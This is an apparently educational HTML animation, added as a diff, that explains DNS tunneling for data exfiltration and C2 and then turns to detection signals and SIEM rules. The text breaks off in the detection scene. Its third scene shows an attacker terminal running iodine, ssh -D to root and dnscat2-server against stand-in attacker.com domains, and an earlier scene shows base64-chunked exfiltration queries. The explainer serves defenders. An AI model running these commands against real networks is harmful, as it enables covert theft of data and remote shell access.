@@ -1,0 +1,773 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>DNS Tunneling & Data Exfiltration</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{
+  background:#0a0a0f;font-family:'Press Start 2P',monospace;
+  width:100%;min-height:100vh;
+  display:flex;flex-direction:column;align-items:center;
+  color:#fff;overflow-x:hidden;
+}
+.scene{width:390px;min-height:100vh;display:none;flex-direction:column}
+.scene.active{display:flex}
+.hdr{height:90px;flex-shrink:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;padding:0 14px;border-bottom:1px solid #0a1a2e}
+.hdr-title{font-size:10px;color:#4ec9e1;text-align:center;letter-spacing:.5px;line-height:1.6}
+.hdr-sub{font-size:7px;color:#555;text-align:center;letter-spacing:1px;line-height:1.6}
+.dots{display:flex;gap:8px}
+.dot{width:11px;height:11px;border-radius:50%;background:#0a1a2e;transition:background .2s}
+.dot.active{background:#4ec9e1}.dot.done{background:#e8a020}
+.slr{height:28px;flex-shrink:0;display:flex;align-items:center;justify-content:space-between;padding:0 14px}
+.slabel{font-size:9px;letter-spacing:1px}
+.sbadge{font-size:7px;padding:3px 8px;border:1px solid currentColor;border-radius:2px}
+.anim{flex:1;overflow-y:auto;overflow-x:hidden;scrollbar-width:none;-ms-overflow-style:none}
+.anim::-webkit-scrollbar{display:none}
+.info{height:110px;flex-shrink:0;margin:0 12px;border:2px solid #4ec9e1;padding:10px 14px;display:flex;flex-direction:column;justify-content:center;gap:7px;font-size:9px;line-height:1.9}
+.info.am{border-color:#e8a020}.info.rd{border-color:#e85050}.info.gn{border-color:#4eff9a}.info.pu{border-color:#a060c0}
+.il{color:#aaa}.ih{color:#4ec9e1}.ih.am{color:#e8a020}.ih.rd{color:#e85050}.ih.gn{color:#4eff9a}.ih.pu{color:#a060c0}
+.srow{height:70px;flex-shrink:0;display:flex;gap:8px;padding:8px 12px}
+.sc{flex:1;background:#060810;border:1px solid #0a1a2e;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px}
+.sv{font-size:11px;color:#4ec9e1;text-align:center}
+.sv.am{color:#e8a020}.sv.gn{color:#4eff9a}.sv.rd{color:#e85050}.sv.pu{color:#a060c0}
+.sl{font-size:7px;color:#555;text-align:center;line-height:1.4}
+.ctrl{height:68px;flex-shrink:0;display:flex;align-items:center;justify-content:center;gap:10px;padding:0 12px}
+.btn{font-family:'Press Start 2P',monospace;font-size:9px;padding:10px 14px;border:2px solid #4ec9e1;background:transparent;color:#4ec9e1;cursor:pointer;transition:all .15s}
+.btn:hover{background:#4ec9e120}.btn:active{transform:scale(.97)}
+.btn.play{border-color:#e8a020;color:#e8a020}.btn.play:hover{background:#e8a02020}
+.btn.gn{border-color:#4eff9a;color:#4eff9a}.btn.gn:hover{background:#4eff9a20}
+.btn.rd{border-color:#e85050;color:#e85050}.btn.rd:hover{background:#e8505020}
+.btn:disabled{opacity:.3;cursor:default}
+
+.step-block{
+  display:flex;align-items:flex-start;gap:10px;padding:10px;
+  border:1px solid #0a1a2e;border-radius:2px;border-left:3px solid #4ec9e1;
+  opacity:0;transform:translateY(8px);
+  transition:opacity .35s ease,transform .35s ease;
+}
+.step-block.visible{opacity:1;transform:translateY(0)}
+.step-block.am{border-left-color:#e8a020}
+.step-block.rd{border-left-color:#e85050}
+.step-block.gn{border-left-color:#4eff9a}
+.step-block.pu{border-left-color:#a060c0}
+.step-num{font-size:9px;color:#4ec9e1;flex-shrink:0;width:16px;text-align:center;padding-top:1px}
+.step-num.am{color:#e8a020}.step-num.rd{color:#e85050}.step-num.gn{color:#4eff9a}
+.step-text{font-size:7px;color:#ccc;line-height:1.9;flex:1}
+.cy{color:#4ec9e1}.am{color:#e8a020}.gn{color:#4eff9a}.pu{color:#a060c0}.rd{color:#e85050}
+
+.detail-hero{border:2px solid;border-radius:3px;padding:10px;opacity:0;transition:opacity .5s}
+.detail-hero.visible{opacity:1}
+
+.fw-beam{stroke-dasharray:200;stroke-dashoffset:200;transition:stroke-dashoffset .7s ease-out}
+.fw-beam.go{stroke-dashoffset:0}
+
+@keyframes typeSlide{from{width:0}to{width:100%}}
+.type-in{overflow:hidden;white-space:nowrap;animation:typeSlide .9s steps(40) forwards}
+
+@keyframes pktBounce{
+  0%{transform:translateX(0) translateY(0)}
+  25%{transform:translateX(0) translateY(-3px)}
+  50%{transform:translateX(0) translateY(0)}
+  75%{transform:translateX(0) translateY(-3px)}
+  100%{transform:translateX(0) translateY(0)}
+}
+.pkt-bounce{animation:pktBounce 1.2s ease-in-out infinite}
+
+.chunk{
+  opacity:0;transform:scale(.8);
+  transition:opacity .25s ease,transform .25s ease;
+}
+.chunk.visible{opacity:1;transform:scale(1)}
+
+.det-row{
+  opacity:0;transform:translateX(-8px);
+  transition:opacity .3s ease,transform .3s ease;
+}
+.det-row.visible{opacity:1;transform:translateX(0)}
+
+.def-card{
+  opacity:0;transform:translateY(8px);
+  transition:opacity .4s ease,transform .4s ease;
+}
+.def-card.visible{opacity:1;transform:translateY(0)}
+
+@keyframes alertPulse{
+  0%,100%{border-color:#e85050;background:#0f0606}
+  50%{border-color:#ff8080;background:#1a0808}
+}
+.alert-pulse{animation:alertPulse 1s ease-in-out 3}
+
+@keyframes queryScroll{
+  0%{transform:translateX(100%)}
+  100%{transform:translateX(-100%)}
+}
+.query-scroll{animation:queryScroll 8s linear infinite;white-space:nowrap}
+
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+.blink{animation:blink 1s step-end infinite}
+
+.tl-step{
+  opacity:0;transform:translateX(-10px);
+  transition:opacity .35s ease,transform .35s ease;
+}
+.tl-step.visible{opacity:1;transform:translateX(0)}
+</style>
+</head>
+<body>
+
+<!-- ══════════════════ SCENE 1: HOOK ══════════════════ -->
+<div class="scene active" id="s1" style="background:#06080f">
+  <div class="hdr" style="background:#06080f">
+    <div class="hdr-title">DNS TUNNELING</div>
+    <div class="hdr-sub">DATA EXFILTRATION · APT C2 · PORT 53</div>
+    <div class="dots">
+      <div class="dot active"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+  </div>
+  <div class="slr">
+    <span class="slabel" style="color:#4ec9e1">HOOK</span>
+    <span class="sbadge" style="color:#e85050;border-color:#e85050">⚠ ADVANCED</span>
+  </div>
+
+  <div class="anim" style="background:#06080f">
+    <div style="padding:12px 14px 14px;display:flex;flex-direction:column;gap:10px">
+
+      <div id="s1-hero" style="border:2px solid #4ec9e1;border-radius:3px;padding:14px;opacity:0;transition:opacity .5s;text-align:center;background:#04060c">
+        <div style="font-size:7px;color:#4ec9e1;letter-spacing:2px;margin-bottom:10px">THE INVISIBLE CHANNEL</div>
+        <div style="font-size:9px;color:#cce8ff;line-height:1.9;margin-bottom:8px">ATTACKERS CAN STEAL<br>YOUR DATA USING<br>ONLY DNS QUERIES —<br>AND MOST FIREWALLS<br>MISS IT</div>
+        <div style="font-size:7px;color:#555;line-height:1.8">Port 53 (DNS) is almost never<br>blocked. That's the problem.</div>
+      </div>
+
+      <div id="s1-fw" style="opacity:0;transition:opacity .5s;border:1px solid #0a1a2e;border-radius:3px;padding:10px;background:#04060c">
+        <div style="font-size:7px;color:#555;letter-spacing:1px;margin-bottom:8px;text-align:center">WHAT GETS PAST THE FIREWALL</div>
+        <div style="display:flex;flex-direction:column;gap:5px">
+          <div style="display:flex;align-items:center;gap:8px">
+            <div style="flex:1;font-size:7px;color:#aaa">HTTPS :443</div>
+            <div style="font-size:8px;color:#e85050">✕ BLOCKED</div>
+            <div style="font-size:7px;color:#555">(DLP)</div>
+          </div>
+          <div style="display:flex;align-items:center;gap:8px">
+            <div style="flex:1;font-size:7px;color:#aaa">FTP :21</div>
+            <div style="font-size:8px;color:#e85050">✕ BLOCKED</div>
+            <div style="font-size:7px;color:#555">(policy)</div>
+          </div>
+          <div style="display:flex;align-items:center;gap:8px">
+            <div style="flex:1;font-size:7px;color:#aaa">SMTP :25</div>
+            <div style="font-size:8px;color:#e85050">✕ BLOCKED</div>
+            <div style="font-size:7px;color:#555">(gateway)</div>
+          </div>
+          <div style="border:1px solid #4ec9e1;border-radius:2px;padding:5px 8px;display:flex;align-items:center;gap:8px;background:#04080e">
+            <div style="flex:1;font-size:7px;color:#4ec9e1">DNS :53</div>
+            <div style="font-size:8px;color:#4eff9a">✓ ALLOWED</div>
+            <div style="font-size:7px;color:#4ec9e1">(always)</div>
+          </div>
+        </div>
+      </div>
+
+      <div id="s1-query" style="opacity:0;transition:opacity .5s;border:1px solid #0a1a2e;border-radius:3px;padding:10px;background:#04060c">
+        <div style="font-size:7px;color:#555;margin-bottom:6px;letter-spacing:1px">NORMAL DNS LOOKUP</div>
+        <div style="background:#020408;border:1px solid #0a1020;border-radius:2px;padding:7px;font-size:7px;line-height:2;word-break:break-all">
+          <span style="color:#4ec9e1">QUERY:</span> <span style="color:#fff">google.com</span> <span style="color:#555">→ 142.250.80.46</span>
+        </div>
+        <div style="font-size:7px;color:#555;margin:6px 0;letter-spacing:1px">DNS TUNNEL QUERY</div>
+        <div style="background:#020408;border:1px solid #3a1040;border-radius:2px;padding:7px;font-size:6px;line-height:2;word-break:break-all">
+          <span style="color:#e85050">QUERY:</span> <span style="color:#e8a020">aGVsbG8gd29ybGQ</span><span style="color:#e85050">.data.attacker.com</span>
+          <div style="color:#555;margin-top:2px">↑ base64 encoded stolen data in subdomain</div>
+        </div>
+      </div>
+
+      <div id="s1-cta" style="text-align:center;font-size:7px;color:#333;letter-spacing:1px;opacity:0;transition:opacity .5s">
+        TAP NEXT ▶ TO SEE HOW IT WORKS
+      </div>
+
+    </div>
+  </div>
+
+  <div class="info">
+    <div class="il">DNS TUNNELING</div>
+    <div class="ih">Port 53 is the fire exit attackers use</div>
+    <div class="il" style="font-size:7px">DNS is essential infrastructure — blocking it breaks the internet. So firewalls leave it open. Attackers encode arbitrary data into DNS query subdomains and smuggle it out undetected.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv cy">:53</div><div class="sl">DNS port<br>always open</div></div>
+    <div class="sc"><div class="sv am">UDP</div><div class="sl">low overhead<br>no connection</div></div>
+    <div class="sc"><div class="sv rd">APT</div><div class="sl">used in nation-<br>state attacks</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" disabled>◀ PREV</button>
+    <button class="btn play" onclick="playScene(1)">▶ PLAY</button>
+    <button class="btn" onclick="goScene(2)">NEXT ▶</button>
+  </div>
+</div>
+
+<!-- ══════════════════ SCENE 2: HOW DNS TUNNELING WORKS ══════════════════ -->
+<div class="scene" id="s2" style="background:#06080f">
+  <div class="hdr" style="background:#06080f">
+    <div class="hdr-title" style="color:#e8a020">HOW DNS TUNNELING WORKS</div>
+    <div class="hdr-sub">ENCODE DATA IN SUBDOMAIN · DECODE AT NS SERVER</div>
+    <div class="dots">
+      <div class="dot done"></div>
+      <div class="dot active"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+  </div>
+  <div class="slr">
+    <span class="slabel" style="color:#e8a020">TECHNIQUE</span>
+    <span class="sbadge" style="color:#e8a020;border-color:#e8a020">EXFIL</span>
+  </div>
+
+  <div class="anim" style="background:#06080f">
+    <div style="padding:10px 14px 14px;display:flex;flex-direction:column;gap:9px">
+
+      <!-- ═══ FIXED SVG — font sizes bumped from 3-4px → 5-7px, viewBox taller ═══ -->
+      <div class="detail-hero" id="s2-hero" style="border-color:#e8a020;background:#0a0800">
+        <div style="font-size:7px;color:#e8a020;letter-spacing:1px;margin-bottom:8px;text-align:center">END-TO-END DNS TUNNEL FLOW</div>
+
+        <svg width="358" height="260" viewBox="0 0 358 260">
+
+          <!-- ── VICTIM box ── -->
+          <rect x="2" y="76" width="76" height="100" rx="4" fill="#0d0b04" stroke="#e8a020" stroke-width="2"/>
+          <text x="40" y="94"  text-anchor="middle" fill="#e8a020"  font-family="'Press Start 2P'" font-size="7">VICTIM</text>
+          <text x="40" y="108" text-anchor="middle" fill="#888"     font-family="'Press Start 2P'" font-size="5">iodine /</text>
+          <text x="40" y="120" text-anchor="middle" fill="#888"     font-family="'Press Start 2P'" font-size="5">dnscat2</text>
+          <text x="40" y="134" text-anchor="middle" fill="#555"     font-family="'Press Start 2P'" font-size="5">data→base64</text>
+          <text x="40" y="146" text-anchor="middle" fill="#555"     font-family="'Press Start 2P'" font-size="5">→subdomain</text>
+          <text x="40" y="168" text-anchor="middle" fill="#e8a020"  font-family="'Press Start 2P'" font-size="5">corp network</text>
+
+          <!-- ── FIREWALL bar ── -->
+          <rect x="84" y="46" width="22" height="150" rx="3" fill="#0d0818" stroke="#4ec9e1" stroke-width="2"/>
+          <!-- rotated label -->
+          <text x="95" y="136" text-anchor="middle" fill="#4ec9e1" font-family="'Press Start 2P'" font-size="6" transform="rotate(-90,95,136)">FIREWALL</text>
+
+          <!-- allowed badge (top of firewall) -->
+          <text id="s2-allowed"  x="95" y="54"  text-anchor="middle" fill="#4eff9a" font-family="'Press Start 2P'" font-size="5" opacity="0">✓:53</text>
+          <text id="s2-allowed2" x="95" y="64"  text-anchor="middle" fill="#4eff9a" font-family="'Press Start 2P'" font-size="5" opacity="0">OPEN</text>
+
+          <!-- blocked cross (bottom of firewall) -->
+          <text id="s2-blk1" x="95" y="178" text-anchor="middle" fill="#e85050" font-family="'Press Start 2P'" font-size="8" opacity="0">✕</text>
+          <text id="s2-blk2" x="95" y="190" text-anchor="middle" fill="#555"    font-family="'Press Start 2P'" font-size="5" opacity="0">HTTPS</text>
+          <text id="s2-blk3" x="95" y="200" text-anchor="middle" fill="#555"    font-family="'Press Start 2P'" font-size="5" opacity="0">blocked</text>
+
+          <!-- ── ISP DNS resolver ── -->
+          <rect x="112" y="98" width="76" height="60" rx="3" fill="#0a0a14" stroke="#555" stroke-width="1.5"/>
+          <text x="150" y="116" text-anchor="middle" fill="#888" font-family="'Press Start 2P'" font-size="6">ISP DNS</text>
+          <text x="150" y="130" text-anchor="middle" fill="#555" font-family="'Press Start 2P'" font-size="5">resolver</text>
+          <text x="150" y="143" text-anchor="middle" fill="#555" font-family="'Press Start 2P'" font-size="5">forwards on</text>
+
+          <!-- ── ATTACKER NS SERVER ── -->
+          <rect x="196" y="66" width="158" height="126" rx="4" fill="#150d00" stroke="#e85050" stroke-width="2"/>
+          <text x="275" y="84"  text-anchor="middle" fill="#e85050"  font-family="'Press Start 2P'" font-size="7">ATTACKER</text>
+          <text x="275" y="97"  text-anchor="middle" fill="#e85050"  font-family="'Press Start 2P'" font-size="7">NS SERVER</text>
+          <text x="275" y="112" text-anchor="middle" fill="#888"     font-family="'Press Start 2P'" font-size="5">ns1.attacker.com</text>
+          <text x="275" y="125" text-anchor="middle" fill="#555"     font-family="'Press Start 2P'" font-size="5">auth for:</text>
+          <text x="275" y="138" text-anchor="middle" fill="#e8a020"  font-family="'Press Start 2P'" font-size="5">tunnel.attacker.com</text>
+          <text x="275" y="153" text-anchor="middle" fill="#4eff9a"  font-family="'Press Start 2P'" font-size="5">decodes payload</text>
+          <text x="275" y="166" text-anchor="middle" fill="#4eff9a"  font-family="'Press Start 2P'" font-size="5">sends commands</text>
+          <text x="275" y="181" text-anchor="middle" fill="#555"     font-family="'Press Start 2P'" font-size="5">via TXT records</text>
+
+          <!-- ── Query label box (top area) ── -->
+          <rect id="s2-qlbl" x="84" y="4" width="270" height="60" rx="3" fill="#0d0800" stroke="#e8a020" stroke-width="1" opacity="0"/>
+          <text id="s2-qt1" x="219" y="19"  text-anchor="middle" fill="#e8a020"  font-family="'Press Start 2P'" font-size="6" opacity="0">DNS QUERY:</text>
+          <text id="s2-qt2" x="219" y="34"  text-anchor="middle" fill="#e85050"  font-family="'Press Start 2P'" font-size="5" opacity="0">aGVsbG8.data.tunnel.attacker.com</text>
+          <text id="s2-qt3" x="219" y="50"  text-anchor="middle" fill="#555"     font-family="'Press Start 2P'" font-size="5" opacity="0">↑ base64("hello") in subdomain</text>
+
+          <!-- ── Response label (bottom) ── -->
+          <text id="s2-resp-lbl" x="179" y="252" text-anchor="middle" fill="#4eff9a" font-family="'Press Start 2P'" font-size="5" opacity="0">← TXT record carries C2 commands back</text>
+
+          <!-- ── Forward beams: data going VICTIM → ATTACKER ── -->
+          <!-- victim right → firewall left -->
+          <path id="s2-b1" d="M78,120 L84,120" stroke="#e8a020" stroke-width="2.5" fill="none" stroke-dasharray="200" stroke-dashoffset="200"/>
+          <!-- firewall right → ISP left -->
+          <path id="s2-b2" d="M106,120 L112,120" stroke="#e8a020" stroke-width="2.5" fill="none" stroke-dasharray="200" stroke-dashoffset="200"/>
+          <!-- ISP right → attacker left -->
+          <path id="s2-b3" d="M188,122 L196,122" stroke="#e8a020" stroke-width="2.5" fill="none" stroke-dasharray="200" stroke-dashoffset="200"/>
+
+          <!-- forward arrowheads -->
+          <polygon id="s2-b1tip" points="84,116 90,120 84,124" fill="#e8a020" opacity="0"/>
+          <polygon id="s2-b2tip" points="112,116 118,120 112,124" fill="#e8a020" opacity="0"/>
+          <polygon id="s2-b3tip" points="196,118 202,122 196,126" fill="#e8a020" opacity="0"/>
+
+          <!-- ── Response beams: commands going ATTACKER → VICTIM ── -->
+          <path id="s2-b4" d="M196,136 L188,136" stroke="#4eff9a" stroke-width="1.5" fill="none" stroke-dasharray="200" stroke-dashoffset="200"/>
+          <path id="s2-b5" d="M112,136 L106,136" stroke="#4eff9a" stroke-width="1.5" fill="none" stroke-dasharray="200" stroke-dashoffset="200"/>
+          <path id="s2-b6" d="M84,136 L78,136" stroke="#4eff9a" stroke-width="1.5" fill="none" stroke-dasharray="200" stroke-dashoffset="200"/>
+
+          <!-- response arrowheads -->
+          <polygon id="s2-b4tip" points="188,132 182,136 188,140" fill="#4eff9a" opacity="0"/>
+          <polygon id="s2-b5tip" points="106,132 100,136 106,140" fill="#4eff9a" opacity="0"/>
+          <polygon id="s2-b6tip" points="78,132 72,136 78,140"   fill="#4eff9a" opacity="0"/>
+
+        </svg>
+      </div>
+
+      <!-- encoding breakdown -->
+      <div id="s2-encode" style="border:1px solid #1a1000;border-radius:3px;padding:10px;background:#080600;opacity:0;transition:opacity .5s">
+        <div style="font-size:7px;color:#e8a020;letter-spacing:1px;margin-bottom:7px">HOW DATA IS ENCODED</div>
+        <div style="display:flex;flex-direction:column;gap:4px;font-size:6px;line-height:2">
+          <div class="chunk" id="ck1">
+            <span style="color:#555">Step 1:</span> <span style="color:#4ec9e1">secret_document.pdf</span> <span style="color:#555">→ read raw bytes</span>
+          </div>
+          <div class="chunk" id="ck2">
+            <span style="color:#555">Step 2:</span> <span style="color:#4eff9a">base64</span> encode → <span style="color:#e8a020">c2VjcmV0X2RvY3Vt</span>...
+          </div>
+          <div class="chunk" id="ck3">
+            <span style="color:#555">Step 3:</span> chunk into <span style="color:#4ec9e1">≤63 char</span> labels (DNS limit)
+          </div>
+          <div class="chunk" id="ck4">
+            <span style="color:#555">Step 4: send</span> <span style="color:#e85050">c2VjcmV0.X2RvY3Vt.chunk3.tunnel.attacker.com</span>
+          </div>
+          <div class="chunk" id="ck5">
+            <span style="color:#555">Step 5:</span> NS server <span style="color:#4eff9a">logs each query subdomain → reassembles file</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="step-block am" id="s2-s1">
+        <div class="step-num am">01</div>
+        <div class="step-text">The attacker controls a <span class="am">nameserver for their own domain</span> (e.g. attacker.com). Every DNS query for *.attacker.com flows to their NS server. The NS server is their C2.</div>
+      </div>
+      <div class="step-block am" id="s2-s2">
+        <div class="step-num am">02</div>
+        <div class="step-text">DNS queries travel through the ISP's recursive resolver to the attacker's NS. The <span class="am">firewall sees only DNS port 53</span> — it doesn't inspect subdomain content. Data exfiltrated silently.</div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="info am">
+    <div class="il">WHY IT WORKS</div>
+    <div class="ih am">DNS is recursive — queries reach attacker's NS by design</div>
+    <div class="il" style="font-size:7px">DNS delegation means any query for attacker.com flows to their nameserver globally — through every resolver, through every corporate firewall. No direct connection needed.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv am">63B</div><div class="sl">max chars<br>per DNS label</div></div>
+    <div class="sc"><div class="sv cy">b64</div><div class="sl">data encoded<br>in subdomain</div></div>
+    <div class="sc"><div class="sv gn">NS</div><div class="sl">attacker's server<br>receives it all</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" onclick="goScene(1)">◀ PREV</button>
+    <button class="btn play" onclick="playScene(2)">▶ PLAY</button>
+    <button class="btn" onclick="goScene(3)">NEXT ▶</button>
+  </div>
+</div>
+
+<!-- ══════════════════ SCENE 3: TOOLS + C2 CHANNEL ══════════════════ -->
+<div class="scene" id="s3" style="background:#06080f">
+  <div class="hdr" style="background:#06080f">
+    <div class="hdr-title" style="color:#e85050">TOOLS & C2 CHANNEL</div>
+    <div class="hdr-sub">IODINE · DNSCAT2 · COMMAND & CONTROL</div>
+    <div class="dots">
+      <div class="dot done"></div>
+      <div class="dot done"></div>
+      <div class="dot active"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+  </div>
+  <div class="slr">
+    <span class="slabel" style="color:#e85050">TOOLS</span>
+    <span class="sbadge" style="color:#e85050;border-color:#e85050">C2 CHANNEL</span>
+  </div>
+
+  <div class="anim" style="background:#06080f">
+    <div style="padding:10px 14px 14px;display:flex;flex-direction:column;gap:9px">
+
+      <div id="s3-term" style="border:2px solid #e85050;border-radius:3px;background:#0d0404;opacity:0;transition:opacity .5s">
+        <div style="padding:6px 10px;border-bottom:1px solid #2a0808;display:flex;align-items:center;gap:5px">
+          <div style="width:7px;height:7px;border-radius:50%;background:#e85050;opacity:.7"></div>
+          <div style="width:7px;height:7px;border-radius:50%;background:#e8a020;opacity:.5"></div>
+          <span style="font-size:6px;color:#333;margin-left:4px">attacker@kali — dns tunnel</span>
+        </div>
+        <div style="padding:10px 12px;font-size:6px;line-height:2.2">
+          <div id="t1"  style="color:#555"># SERVER: start iodine nameserver</div>
+          <div id="t2"  style="color:#555">$ <span style="color:#e85050">iodined -f 10.0.0.1 tunnel.attacker.com</span></div>
+          <div id="t3"  style="color:#4eff9a">Tunnel IP: 10.0.0.1/24 · Listening...</div>
+          <div style="margin-top:4px"></div>
+          <div id="t4"  style="color:#555"># VICTIM (inside corp network):</div>
+          <div id="t5"  style="color:#555">$ <span style="color:#e8a020">iodine tunnel.attacker.com</span></div>
+          <div id="t6"  style="color:#4eff9a">Connected · tun0: 10.0.0.2 · RTT: 180ms</div>
+          <div style="margin-top:4px"></div>
+          <div id="t7"  style="color:#555"># now have full IP tunnel over DNS!</div>
+          <div id="t8"  style="color:#555">$ <span style="color:#e85050">ssh -D 1080 root@10.0.0.2</span></div>
+          <div id="t9"  style="color:#4eff9a">root@victim:~# <span class="blink">█</span></div>
+          <div style="margin-top:4px"></div>
+          <div id="t10" style="color:#555"># dnscat2: interactive C2 shell</div>
+          <div id="t11" style="color:#555">$ <span style="color:#e85050">dnscat2-server --dns domain=c2.attacker.com</span></div>
+          <div id="t12" style="color:#e8a020">New session established: victim-workstation</div>
+        </div>
+      </div>
+
+      <div id="s3-tools" style="border:1px solid #2a0808;border-radius:3px;padding:10px;background:#0d0404;opacity:0;transition:opacity .5s">
+        <div style="font-size:7px;color:#e85050;letter-spacing:1px;margin-bottom:8px">TOOL COMPARISON</div>
+        <div style="display:flex;gap:8px">
+          <div style="flex:1;border:1px solid #3a0808;border-radius:2px;padding:8px">
+            <div style="font-size:7px;color:#e85050;margin-bottom:5px">iodine</div>
+            <div style="font-size:6px;color:#888;line-height:1.8">Full IP tunnel over DNS. Supports TCP/UDP. Bandwidth ~1Mbit. Used for persistent access and data exfil.</div>
+          </div>
+          <div style="flex:1;border:1px solid #3a1800;border-radius:2px;padding:8px">
+            <div style="font-size:7px;color:#e8a020;margin-bottom:5px">dnscat2</div>
+            <div style="font-size:6px;color:#888;line-height:1.8">C2 shell over DNS. Encrypted. Multiple sessions. Command execution, file transfer. APT favorite.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="step-block rd" id="s3-s1">
+        <div class="step-num rd">01</div>
+        <div class="step-text"><span class="rd">iodine</span> creates a full IP tunnel over DNS. Once connected, attacker can SSH into the victim, browse their intranet, and exfiltrate files — all traffic disguised as DNS queries.</div>
+      </div>
+      <div class="step-block rd" id="s3-s2">
+        <div class="step-num rd">02</div>
+        <div class="step-text"><span class="am">dnscat2</span> is purpose-built for C2 over DNS. Encrypted sessions. Multiple command shells. Runs on Windows, Linux, macOS. Used in real APT campaigns (OilRig, APT29 tooling).</div>
+      </div>
+      <div class="step-block rd" id="s3-s3">
+        <div class="step-num rd">03</div>
+        <div class="step-text">Bandwidth is <span class="rd">low (~10–500 KB/s)</span> but sufficient for: credentials, SSH keys, source code, small databases, shell commands. APTs use it for persistent low-and-slow exfiltration over weeks.</div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="info rd">
+    <div class="il">C2 OVER DNS</div>
+    <div class="ih rd">Full shell access through any DNS-permissive firewall</div>
+    <div class="il" style="font-size:7px">Nation-state groups use DNS tunneling when all other channels are blocked. If a machine can resolve DNS, it can be a C2 node. No direct inbound connection needed.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv rd">iodine</div><div class="sl">full IP<br>tunnel</div></div>
+    <div class="sc"><div class="sv am">dnscat2</div><div class="sl">C2 shell<br>over DNS</div></div>
+    <div class="sc"><div class="sv cy">~500KB</div><div class="sl">max exfil<br>bandwidth</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" onclick="goScene(2)">◀ PREV</button>
+    <button class="btn play" onclick="playScene(3)">▶ PLAY</button>
+    <button class="btn" onclick="goScene(4)">NEXT ▶</button>
+  </div>
+</div>
+
+<!-- ══════════════════ SCENE 4: DETECTION ══════════════════ -->
+<div class="scene" id="s4" style="background:#06080f">
+  <div class="hdr" style="background:#06080f">
+    <div class="hdr-title" style="color:#e8a020">DETECTION SIGNALS</div>
+    <div class="hdr-sub">ANOMALOUS QUERY LENGTH · FREQUENCY · SIEM RULES</div>
+    <div class="dots">
+      <div class="dot done"></div>
+      <div class="dot done"></div>
+      <div class="dot done"></div>
+      <div class="dot active"></div>
+      <div class="dot"></div>
+    </div>
+  </div>
+  <div class="slr">
+    <span class="slabel" style="color:#e8a020">DETECTION</span>
+    <span class="sbadge" style="color:#e8a020;border-color:#e8a020">SIEM RULES</span>
+  </div>
+
+  <div class="anim" style="background:#06080f">
+    <div style="padding:10px 14px 14px;display:flex;flex-direction:column;gap:9px">
+
+      <div id="s4-compare" style="border:2px solid #e8a020;border-radius:3px;padding:10px;background:#0a0800;opacity:0;transition:opacity .5s">
+        <div style="font-size:7px;color:#e8a020;letter-spacing:1px;margin-bottom:8px">NORMAL DNS vs TUNNEL DNS</div>
+        <div style="display:flex;gap:8px">
+          <div style="flex:1;border:1px solid #0d2010;border-radius:2px;padding:8px;background:#040c04">
+            <div style="font-size:7px;color:#4eff9a;margin-bottom:5px">NORMAL</div>
+            <div style="font-size:6px;color:#888;line-height:1.9">
+              Queries: ~30/hr<br>
+              Length: 10–40 chars<br>
+              Domains: known TLDs<br>
+              Records: A, AAAA, MX<br>
+              Pattern: random times
+            </div>
+          </div>
+          <div style="flex:1;border:1px solid #2a1000;border-radius:2px;padding:8px;background:#0d0800">
+            <div style="font-size:7px;color:#e85050;margin-bottom:5px">TUNNEL ⚠</div>
+            <div style="font-size:6px;color:#888;line-height:1.9">
+              Queries: <span style="color:#e85050">1000s/min</span><br>
+              Length: <span style="color:#e85050">100–200 chars</span><br>
+              Domains: <span style="color:#e85050">1 strange domain</span><br>
+              Records: <span style="color:#e85050">TXT, NULL types</span><br>
+              Pattern: <span style="color:#e85050">rapid bursts</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div id="s4-siem" style="border:1px solid #2a1000;border-radius:3px;padding:10px;background:#0a0600;opacity:0;transition:opacity .5s">
+        <div style="font-size:7px;color:#e8a020;letter-spacing:1px;margin-bottom:8px">SIEM DETECTION RULES</div>
+        <div style="display:flex;flex-direction:column;gap:5px">
+          <div class="det-row" id="dr1" style="padding:6px 8px;border:1px solid #2a0808;border-radius:2px;background:#0d0404">
+            <div style="font-size:7px;color:#e85050;margin-bottom:3px">HIGH · DNS TUNNEL INDICATOR</div>
+            <div style="font-size:6px;color:#888;line-height:1.7">Query length &gt;100 chars from single host. Triggered: workstation-14 querying *.attacker.com. 4,200 queries in 60s.</div>
+          </div>
+          <div class="det-row" id="dr2" style="padding:6px 8px;border:1px solid #3a1400;border-radius:2px;background:#0d0800">
+            <div style="font-size:7px;color:#e8a020;margin-bottom:3px">MED · ANOMALOUS DNS VOLUME</div>
+            <div style="font-size:6px;color:#888;line-height:1.7">Single source IP: 10.1.1.45 made 5,000 DNS queries in 5 minutes to same domain. Baseline: 80/hr.</div>
+          </div>
+          <div class="det-row" id="dr3" style="padding:6px 8px;border:1px solid #2a0808;border-radius:2px;background:#0d0404">
+            <div style="font-size:7px;color:#e85050;margin-bottom:3px">HIGH · TXT RECORD ABUSE</div>
+            <div style="font-size:6px;color:#888;line-height:1.7">TXT record queries for non-email domain. TXT records are primary C2 response channel in dnscat2.</div>
+          </div>
+          <div class="det-row" id="dr4" style="padding:6px 8px;border:1px solid #1a1a00;border-radius:2px;background:#0a0a04">
